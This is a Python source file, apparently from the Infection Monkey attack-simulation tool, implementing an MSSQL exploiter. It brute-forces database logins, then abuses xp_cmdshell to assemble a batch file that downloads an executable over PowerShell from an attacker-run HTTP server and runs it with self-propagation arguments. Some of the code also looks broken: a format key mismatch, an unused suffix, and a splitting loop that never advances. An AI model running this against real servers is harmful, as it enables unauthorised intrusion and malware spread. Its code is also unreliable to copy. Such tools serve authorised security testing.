import logging
import os
import textwrap
from time import sleep

import pymssql

from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit import HostExploiter
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.tools.helpers import get_monkey_dest_path, get_target_monkey, \
    build_monkey_commandline, get_monkey_depth
from infection_monkey.model import DROPPER_ARG
from infection_monkey.utils import get_monkey_dir_path

LOG = logging.getLogger(__name__)


class MSSQLExploiter(HostExploiter):

    _EXPLOITED_SERVICE = 'MSSQL'
    _TARGET_OS_TYPE = ['windows']
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    LOGIN_TIMEOUT = 15
    # Time in seconds to wait between MSSQL queries.
    QUERY_BUFFER = 0.5
    SQL_DEFAULT_TCP_PORT = '1433'
    # Temporary file that saves commands for monkey's download and execution.
    TMP_FILE_NAME = 'tmp_monkey.bat'
    MAX_XP_CMDSHELL_SIZE = 128

    EXPLOIT_COMMAND_PREFIX = "xp_cmdshell \"<nul set /p="
    EXPLOIT_COMMAND_SUFFIX = ">>%%(payload_file_path)s"
    MONKEY_DOWNLOAD_COMMAND = "powershell (new-object System.Net.WebClient)." \
                              "DownloadFile(^\'%%(http_path)s^\' , ^\'%%(local_path)s^\')"

    def __init__(self, host):
        super(MSSQLExploiter, self).__init__(host)

    def _exploit_host(self):
        # Brute force to get connection
        username_passwords_pairs_list = self._config.get_exploit_user_password_pairs()
        cursor = self.brute_force(self.host.ip_addr, self.SQL_DEFAULT_TCP_PORT, username_passwords_pairs_list)

        if not cursor:
            LOG.error("Bruteforce process failed on host: {0}".format(self.host.ip_addr))
            return False

        # Get monkey exe for host and it's path
        src_path = get_target_monkey(self.host)
        if not src_path:
            LOG.info("Can't find suitable monkey executable for host %r", self.host)
            return False

        # Create server for http download and wait for it's startup.
        http_path, http_thread = HTTPTools.create_locked_transfer(self.host, src_path)
        if not http_path:
            LOG.debug("Exploiter failed, http transfer creation failed.")
            return False
        LOG.info("Started http server on %s", http_path)

        dst_path = get_monkey_dest_path(http_path)
        tmp_file_path = os.path.join(get_monkey_dir_path(), MSSQLExploiter.TMP_FILE_NAME)

        # Create monkey dir.
        commands = ["xp_cmdshell \"mkdir %s\"" % get_monkey_dir_path()]
        MSSQLExploiter.execute_command(cursor, commands)

        # Form download command
        download_command = MSSQLExploiter.MONKEY_DOWNLOAD_COMMAND % {'http_path': http_path, 'dst_path': dst_path}
        # Form suffix
        suffix = MSSQLExploiter.EXPLOIT_COMMAND_SUFFIX % {'payload_file_path': tmp_file_path}

        exploit_command = MSSQLCommand(download_command,
                                       prefix=MSSQLExploiter.EXPLOIT_COMMAND_PREFIX,
                                       suffix=MSSQLExploiter.EXPLOIT_COMMAND_SUFFIX,
                                       max_length=MSSQLExploiter.MAX_XP_CMDSHELL_SIZE)
        # Split command into chunks mssql xp_cmdshell can execute
        commands = exploit_command.split_into_array_of_smaller_strings()

        MSSQLExploiter.execute_command(cursor, commands)
        MSSQLExploiter.run_file(cursor, tmp_file_path)
        self.add_executed_cmd(' '.join(commands))
        # Form monkey's command in a file
        monkey_args = build_monkey_commandline(self.host,
                                               get_monkey_depth() - 1,
                                               dst_path)
        monkey_args = ["xp_cmdshell \"<nul set /p=%s >>%s\"" % (part, tmp_file_path)
                       for part in textwrap.wrap(monkey_args, 40)]
        commands = ["xp_cmdshell \"<nul set /p=%s %s >%s\"" % (dst_path, DROPPER_ARG, tmp_file_path)]
        commands.extend(monkey_args)
        MSSQLExploiter.execute_command(cursor, commands)
        MSSQLExploiter.run_file(cursor, tmp_file_path)
        self.add_executed_cmd(commands[-1])
        return True

    @staticmethod
    def run_file(cursor, file_path):
        command = ["exec xp_cmdshell \"%s\"" % file_path]
        return MSSQLExploiter.execute_command(cursor, command)

    @staticmethod
    def execute_command(cursor, cmds):
        """
        Executes commands on MSSQL server
        :param cursor: MSSQL connection
        :param cmds: list of commands in MSSQL syntax.
        :return: True if successfully executed, false otherwise.
        """
        try:
            # Running the cmd on remote host
            for cmd in cmds:
                cursor.execute(cmd)
                sleep(MSSQLExploiter.QUERY_BUFFER)
        except Exception as e:
            LOG.error('Error sending the payload using xp_cmdshell to host: %s' % e)
            return False
        return True

    def brute_force(self, host, port, users_passwords_pairs_list):
        """
        Starts the brute force connection attempts and if needed then init the payload process.
        Main loop starts here.

        Args:
            host (str): Host ip address
            port (str): Tcp port that the host listens to
            users_passwords_pairs_list (list): a list of users and passwords pairs to bruteforce with

        Return:
            True or False depends if the whole bruteforce and attack process was completed successfully or not
        """
        # Main loop
        # Iterates on users list
        for user, password in users_passwords_pairs_list:
            try:
                # Core steps
                # Trying to connect
                conn = pymssql.connect(host, user, password, port=port, login_timeout=self.LOGIN_TIMEOUT)
                LOG.info(
                    'Successfully connected to host: {0}, using user: {1}, password (SHA-512): {2}'.format(
                        host, user, self._config.hash_sensitive_data(password)))
                self.add_vuln_port(MSSQLExploiter.SQL_DEFAULT_TCP_PORT)
                self.report_login_attempt(True, user, password)
                cursor = conn.cursor()
                return cursor
            except pymssql.OperationalError:
                self.report_login_attempt(False, user, password)
                # Combo didn't work, hopping to the next one
                pass

        LOG.warning('No user/password combo was able to connect to host: {0}:{1}, '
                    'aborting brute force'.format(host, port))
        return None


class MSSQLCommand(object):

    def __init__(self, command, max_length, prefix="", suffix=""):
        self.command = command
        self.max_length = max_length
        self.prefix = prefix
        self.suffix = suffix

    def get_full_command(self, command):
        return "{}{}{}".format(self.prefix, command, self.suffix)

    def split_into_array_of_smaller_strings(self):
        remaining_command_to_split = self.command
        commands = []
        while self.command_is_too_long(self.get_full_command(remaining_command_to_split)):
            command_of_max_len, remaining_command = self.split_at_max_length(remaining_command_to_split)
            commands.append(self.get_full_command(command_of_max_len))
        if remaining_command_to_split:
            commands.append(remaining_command_to_split)
        return commands

    def split_at_max_length(self, command):
        substring_size = self.max_length - len(self.prefix) - len(self.command) - 1
        return self.get_full_command(command[0:substring_size]), command[substring_size:]

    def command_is_too_long(self, command):
        return len(command)+len(self.prefix)+len(self.suffix) > self.max_length
